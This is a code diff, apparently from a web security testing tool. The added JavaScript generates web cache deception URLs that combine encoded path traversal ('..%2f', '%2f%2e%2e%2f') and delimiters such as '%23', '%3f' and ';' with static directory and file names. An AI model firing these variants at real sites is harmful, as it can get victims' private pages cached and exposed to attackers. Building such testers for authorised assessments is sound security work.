@@ -149,6 +149,18 @@
         variants.push({ name: "delimiter:" + delimiter + ":" + extension, url: parsed.origin + path + delimiter + token + "." + extension + parsed.query });
       });
     });
+    var dynamicPath = path.replace(/^\//, ""), staticDirectories = input.static_directories && input.static_directories.length ? input.static_directories : ["resources", "assets", "static"];
+    staticDirectories.slice(0, 10).forEach(function (directory) {
+      variants.push({ name: "origin-normalization:" + directory, url: parsed.origin + "/" + directory + "/..%2f" + dynamicPath + parsed.query });
+      (input.normalization_delimiters && input.normalization_delimiters.length ? input.normalization_delimiters : ["%23", "%3f", ";"]).slice(0, 8).forEach(function (delimiter) {
+        variants.push({ name: "cache-normalization:" + delimiter + ":" + directory, url: parsed.origin + path + delimiter + "%2f%2e%2e%2f" + directory + parsed.query });
+      });
+    });
+    (input.exact_cache_files && input.exact_cache_files.length ? input.exact_cache_files : ["robots.txt", "favicon.ico", "index.html"]).slice(0, 10).forEach(function (file) {
+      (input.normalization_delimiters && input.normalization_delimiters.length ? input.normalization_delimiters : ["%23", "%3f", ";"]).slice(0, 8).forEach(function (delimiter) {
+        variants.push({ name: "exact-normalization:" + delimiter + ":" + file, url: parsed.origin + path + delimiter + "%2f%2e%2e%2f" + file + parsed.query });
+      });
+    });
     return variants.slice(0, Math.max(1, Math.min(Number(input.max_deception_variants || 40), 100)));
   }
 
